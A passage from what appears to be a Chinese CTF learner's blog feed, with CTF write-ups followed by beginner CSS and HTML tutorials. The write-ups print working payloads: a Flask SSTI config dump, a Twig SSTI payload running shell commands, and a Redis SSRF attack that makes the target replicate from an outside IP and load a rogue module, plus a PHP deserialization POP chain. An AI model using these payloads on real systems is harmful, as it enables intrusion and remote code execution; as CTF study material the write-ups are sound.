class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages()"></a>get_flashed_messages()</h4><p>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> message <span class="keyword">in</span> get_flashed_messages()%&#125;</span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><p>可以看见这两个函数都是可以调用到__globals__魔术方法的,并且有current_app这个变量</p><ul><li>__globals__  : 函数中全局变量的字典的引用(函数所属模块的全局命名空间)</li></ul><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124000216790.png" alt="image-20240124000216790"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124000328684.png" alt="image-20240124000328684"></p><p>这个current_app实例就是当前运行的这个app,所有可以直接访问到它下面的config</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__.current_app.config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124000738986.png" alt="image-20240124000738986"></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://guokeya.github.io/post/R7LJ4aK5U/">https://guokeya.github.io/post/R7LJ4aK5U/</a></p><p><a href="https://blog.csdn.net/enjolras_fuu/article/details/82229073">https://blog.csdn.net/enjolras_fuu/article/details/82229073</a></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> Flask secret_key </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020 Cookie is so stable</title>
      <link href="/2024/01/23/BJDCTF2020-Cookie-is-so-stable/"/>
      <url>/2024/01/23/BJDCTF2020-Cookie-is-so-stable/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>随便登录一个用户名,发现会有 hello,xxx的字样</p><p>hint让我们查看一下cookie</p><p>可以看见cookie里面有一个user的值就是回显的内容,这很容易就能想到ssti</p><p>测试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240123222241974.png" alt="image-20240123222241974"></p><p>的确如此哈</p><p>这里是php环境, 不过之前只做过smarty的模板注入,这里简单测试了一下并不是smarty</p><p>找了一篇大佬的好文</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html#">https://www.cnblogs.com/bmjoker/p/13508538.html#</a></p><p>最终的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Twig </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GCTF 2023 web</title>
      <link href="/2024/01/22/GCTF-2023-web/"/>
      <url>/2024/01/22/GCTF-2023-web/</url>
      
        <content type="html"><![CDATA[<h1 id="GCTF"><a href="#GCTF" class="headerlink" title="GCTF"></a>GCTF</h1><h2 id="ezezezphp"><a href="#ezezezphp" class="headerlink" title="ezezezphp"></a>ezezezphp</h2><p>redis主从复制rce</p><p>需要在靶机上执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp/</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 107.148.75.202 21000</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p>使用sec-tool转换为gopher</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%35%0d%0a%2f%74%6d%70%2f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%36%0d%0a%65%78%70%2e%73%6f%0d%0a%2a%33%0d%0a%24%37%0d%0a%73%6c%61%76%65%6f%66%0d%0a%24%31%34%0d%0a%31%30%37%2e%31%34%38%2e%37%35%2e%32%30%32%0d%0a%24%35%0d%0a%32%31%30%30%30%0d%0a%2a%33%0d%0a%24%36%0d%0a%6d%6f%64%75%6c%65%0d%0a%24%34%0d%0a%6c%6f%61%64%0d%0a%24%31%31%0d%0a%2f%74%6d%70%2f%65%78%70%2e%73%6f%0d%0a%2a%32%0d%0a%24%31%31%0d%0a%73%79%73%74%65%6d%2e%65%78%65%63%0d%0a%24%36%0d%0a%77%68%6f%61%6d%69%0d%0a</span><br></pre></td></tr></table></figure><p>利用ssrf来执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;Ha&quot;:3:&#123;s:5:&quot;start&quot;;a:1:&#123;s:3:&quot;POC&quot;;s:3:&quot;0.o&quot;;&#125;s:6:&quot;start1&quot;;O:2:&quot;Rd&quot;:3:&#123;s:6:&quot;ending&quot;;N;s:2:&quot;cl&quot;;O:2:&quot;Er&quot;:2:&#123;s:6:&quot;symbol&quot;;N;s:4:&quot;Flag&quot;;s:703:&quot;gopher://127.0.0.1:6379/_%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%35%0d%0a%2f%74%6d%70%2f%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%36%0d%0a%65%78%70%2e%73%6f%0d%0a%2a%33%0d%0a%24%37%0d%0a%73%6c%61%76%65%6f%66%0d%0a%24%31%34%0d%0a%31%30%37%2e%31%34%38%2e%37%35%2e%32%30%32%0d%0a%24%35%0d%0a%32%31%30%30%30%0d%0a%2a%33%0d%0a%24%36%0d%0a%6d%6f%64%75%6c%65%0d%0a%24%34%0d%0a%6c%6f%61%64%0d%0a%24%31%31%0d%0a%2f%74%6d%70%2f%65%78%70%2e%73%6f%0d%0a%2a%32%0d%0a%24%31%31%0d%0a%73%79%73%74%65%6d%2e%65%78%65%63%0d%0a%24%36%0d%0a%77%68%6f%61%6d%69%0d%0a&quot;;&#125;s:3:&quot;poc&quot;;N;&#125;s:6:&quot;start2&quot;;s:3:&quot;o.0&quot;;&#125;</span><br></pre></td></tr></table></figure><p>pop链子的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span> = <span class="string">&quot;o.0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$nacl</span> = <span class="keyword">new</span> <span class="title class_">Ha</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start1 = <span class="keyword">new</span> <span class="title class_">Rd</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start = <span class="keyword">array</span>(<span class="string">&#x27;POC&#x27;</span> =&gt; <span class="string">&#x27;0.o&#x27;</span>);</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start1-&gt;cl = <span class="keyword">new</span> <span class="title class_">Er</span>();</span><br><span class="line"><span class="variable">$nacl</span>-&gt;start1-&gt;cl-&gt;Flag = <span class="string">&quot;&quot;</span>;<span class="comment">//这里是要执行的gopher的base64</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$nacl</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同时vps使用redis-rogue-server监听21000端口</p><p>payload上传成功</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240123002815556.png" alt="image-20240123002815556"></p><p>之后就可以用system.exec来rce了,但是没有找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/system.exec &#x27;whoami&#x27; //也需要base64后放在pop链子里</span><br></pre></td></tr></table></figure><p>并且尝试了很多反弹shell的方法都没成功,system.rev也没能执行,不知道是不是脚本的问题</p><p>止步于此</p>]]></content>
      
      
      
        <tags>
            
            <tag> ssrf打redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS基础</title>
      <link href="/2024/01/22/CSS%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/01/22/CSS%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS基础"><a href="#CSS基础" class="headerlink" title="CSS基础"></a>CSS基础</h1><p>HTML本身的样式和颜色是比较朴素的,所以就需要CSS来自定义其样式</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS">https://developer.mozilla.org/zh-CN/docs/Learn/CSS</a></p><h2 id="三种CSS的添加方式"><a href="#三种CSS的添加方式" class="headerlink" title="三种CSS的添加方式"></a>三种CSS的添加方式</h2><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><p>CSS保存在.css文件中,在html中使用<code>&lt;link&gt;</code>引用</p><p>如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./css/style.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><p>将CSS放在html的<code>&lt;style&gt;</code>里</p><h3 id="内联样式表"><a href="#内联样式表" class="headerlink" title="内联样式表"></a>内联样式表</h3><p>在某一个元素中直接添加</p><p><strong>一般使用外部样式表</strong></p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p>一般可以通过以下三种选择器对特定的元素改变样式</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122164046366.png" alt="image-20240122164046366"></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>如上,css采用</p><blockquote><p>选择器 {</p><p>​<code>/*注释*/</code></p><p>​属性: 值;</p><p>​属性: 值;</p><p>​…</p><p>}</p></blockquote><p>这样的语法来完成样式的定制</p><h2 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h2><p>在css中常用__标准颜色名称,十六进制颜色表示,RGB颜色模型,HSL颜色模型__来表示颜色,</p><h3 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h3><p>三个参数: red,green,blue</p><h3 id="HSL"><a href="#HSL" class="headerlink" title="HSL"></a>HSL</h3><p>三个参数: 色相(hue)(0<del>360),饱和度(saturatio)(0%</del>100%),明度(lightness)(0%~100%)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122172530961.png" alt="image-20240122172530961"></p><p>示例:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-color</span>:red;&#125;</span><br><span class="line"><span class="selector-tag">h1</span> &#123;<span class="attribute">color</span>:<span class="number">#00ff00</span>;&#125;</span><br><span class="line"><span class="selector-tag">h2</span> &#123;<span class="attribute">color</span>:<span class="built_in">rgb</span>(<span class="number">255</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure><h2 id="CSS盒子模型"><a href="#CSS盒子模型" class="headerlink" title="CSS盒子模型"></a>CSS盒子模型</h2><p>我们可以通过盒子模型来改变一块内容各个区域的大小</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122170625448.png" alt="image-20240122170625448"></p><ul><li><strong>Margin(外边距)</strong> - 清除边框外的区域，外边距是透明的。</li><li><strong>Border(边框)</strong> - 围绕在内边距和内容外的边框。</li><li><strong>Padding(内边距)</strong> - 清除内容周围的区域，内边距是透明的。</li><li><strong>Content(内容)</strong> - 盒子的内容，显示文本和图像。</li></ul><p>一个块元素有以上几个部分构成</p><p>设置示例:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">25px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然也可以针对不同边框的不同部分进行设置</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240122172808392.png" alt="image-20240122172808392"></p><p>示例:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">padding-left</span>: red;</span><br><span class="line">    <span class="attribute">margin-top</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分组与嵌套"><a href="#分组与嵌套" class="headerlink" title="分组与嵌套"></a>分组与嵌套</h2><p>假设对h1,h2,p的css样式相同,可以这样写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span>,<span class="selector-tag">h2</span>,<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attribute">color</span>:green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设对p标签但不同类的元素有不同css样式,可以这样写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span><span class="selector-class">.nacl</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: white;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-class">.cabbage</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: green;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li><strong>p{ }</strong>: 为所有 <strong>p</strong> 元素指定一个样式。</li><li><strong>.marked{ }</strong>: 为所有 <strong>class&#x3D;”marked”</strong> 的元素指定一个样式。</li><li><strong>.marked p{ }</strong>: 为所有 <strong>class&#x3D;”marked”</strong> 元素内的 <strong>p</strong> 元素指定一个样式。</li><li><strong>p.marked{ }</strong>: 为所有 <strong>class&#x3D;”marked”</strong> 的 <strong>p</strong> 元素指定一个样式。</li></ul></blockquote><h2 id="组合选择符"><a href="#组合选择符" class="headerlink" title="组合选择符"></a>组合选择符</h2><p>在 CSS3 中包含了四种组合方式:</p><ul><li>后代选择器(以空格   分隔)</li><li>子元素选择器(以大于 <strong>&gt;</strong> 号分隔）</li><li>相邻兄弟选择器（以加号 <strong>+</strong> 分隔）</li><li>普通兄弟选择器（以波浪号 <strong>～</strong> 分隔）</li></ul><p>例子:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> <span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">表示选择所有在<span class="selector-tag">div</span>标签内的<span class="selector-tag">p</span>标签,无论怎么嵌套</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>&gt;<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">表示选择用于<span class="selector-tag">div</span>标签为父元素的<span class="selector-tag">p</span>标签,即<span class="selector-tag">p</span>为<span class="selector-tag">div</span>的下一级(嵌套一次)</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>+<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">选择紧挨在<span class="selector-tag">div</span>元素的一个<span class="selector-tag">p</span>元素,且他们同父</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>~<span class="selector-tag">p</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attribute">background-color</span>:yellow;</span><br><span class="line">&#125;</span><br><span class="line">选择<span class="selector-tag">div</span>元素之后的所有相邻兄弟<span class="selector-tag">p</span>元素,即选择一连串与之相邻不间断的<span class="selector-tag">p</span>元素</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 语言基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML基础</title>
      <link href="/2024/01/21/HTML%E5%9F%BA%E7%A1%80/"/>
      <url>/2024/01/21/HTML%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML基础"><a href="#HTML基础" class="headerlink" title="HTML基础"></a>HTML基础</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>众所周知HTML是一款超文本标记语言而不是编程语言</p><p>摘自菜鸟教程:</p><blockquote><p>超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。</p><p>您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。</p></blockquote><h2 id="一些过去没注意到的点"><a href="#一些过去没注意到的点" class="headerlink" title="一些过去没注意到的点:"></a>一些过去没注意到的点:</h2><p>HTML的文件后缀名有两种:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.html</span><br><span class="line">.htm</span><br></pre></td></tr></table></figure><p>这两种都是表示html文件,完全一样</p><p>html标签是不区分大小写的,所以:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;TiTLE&gt;&lt;/title&gt;</span><br><span class="line">&lt;TITLE&gt;&lt;/TITLE&gt;</span><br></pre></td></tr></table></figure><p>这些都是等价的</p><p>但通常都写作小写字母</p><p>(这些特性或许有一定的利用价值)</p><h2 id="为什么需要html"><a href="#为什么需要html" class="headerlink" title="为什么需要html?"></a>为什么需要html?</h2><p>以本人浅薄的认知,html的存在正如其名用于标记文本,将不同的文本内容标记上特定标签(tag),用于对每一类型的文本实现不同的显示效果或者对他们进行不同的操作.</p><p>当然这只是便于我个人理解,最终的解释还是得看官方文档</p><p>MDN上的教程: <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML">HTML（超文本标记语言）</a></p><h2 id="标签-元素-属性"><a href="#标签-元素-属性" class="headerlink" title="标签,元素,属性"></a>标签,元素,属性</h2><p>在HTML中,标签 元素 属性通常是关联出现的,一对标签内包含着对应的元素,不同的元素可以有不同的属性</p><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://www.n4c1.top</span>&gt;</span>这是我的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>&lt;p&gt;&lt;/p&gt;</code> <code>&lt;a&gt;&lt;/a&gt;</code>为标签,其中包裹的文字内容为元素,而<code>href</code>则为属性,其指定了一个链接</p><p>当然,单独的这些标签并不能起到我们想要的作用,还需要加上一些特定的html说明</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">http://www.n4c1.top</span>&gt;</span>这是我的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样就构成了完整的一个html文件,开启apache或其他网络服务,我们就可以访问到这个网页的内容</p><p>将它的文件名改为<code>index.html</code>作为网站的起始</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240121125705980.png" alt="image-20240121125705980"></p><h2 id="接下来是一些常用的标签"><a href="#接下来是一些常用的标签" class="headerlink" title="接下来是一些常用的标签"></a>接下来是一些常用的标签</h2><blockquote><p><code>&lt;h1&gt;&lt;/h1&gt;</code>~&#96;<h6></h6>&#96; :分别对应1到6级标题</p><p><code>&lt;p&gt;&lt;/p&gt;</code> : 文字段落标签</p><p><code>&lt;a href=xxxx &gt;&lt;/a&gt;</code> : 超链接标签</p><p><code>&lt;blockquote&gt;&lt;/blockquote&gt;</code> : 引言</p><p><code>&lt;hr&gt;</code>: 水平分割线</p><p><code>&lt;br&gt;</code>: 空白行 </p></blockquote><h3 id="HTML段落"><a href="#HTML段落" class="headerlink" title="HTML段落"></a>HTML段落</h3><p>示例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">abbr</span> <span class="attr">title</span>=<span class="string">&quot;Tianjin University of Technology&quot;</span>&gt;</span>TUT<span class="tag">&lt;/<span class="name">abbr</span>&gt;</span>是一所不错的理工大学<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><p><abbr title="Tianjin University of Technology">TUT</abbr>是一所不错的理工大学</p><p><code>&lt;abbr&gt;</code>标签可以在鼠标放在被包裹的文字上时显示额外的文字</p><h3 id="HTML-列表"><a href="#HTML-列表" class="headerlink" title="HTML 列表"></a>HTML 列表</h3><table><thead><tr><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>&lt;ol&gt;</code></td><td align="left">定义有序列表</td></tr><tr><td align="left"><code>&lt;ul&gt;</code></td><td align="left">定义无序列表</td></tr><tr><td align="left"><code>&lt;li&gt;</code></td><td align="left">定义列表项</td></tr><tr><td align="left"><code>&lt;dl&gt;</code></td><td align="left">定义列表</td></tr><tr><td align="left"><code>&lt;dt&gt;</code></td><td align="left">自定义列表项目</td></tr><tr><td align="left"><code>&lt;dd&gt;</code></td><td align="left">定义自定列表项的描述</td></tr></tbody></table><h5 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表:"></a>无序列表:</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>豆浆<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>油条<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>豆汁<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>焦圈<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果:</p><ul>    <li>豆浆</li>    <li>油条</li>    <li>豆汁</li>    <li>焦圈</li></ul><h5 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表:"></a>有序列表:</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 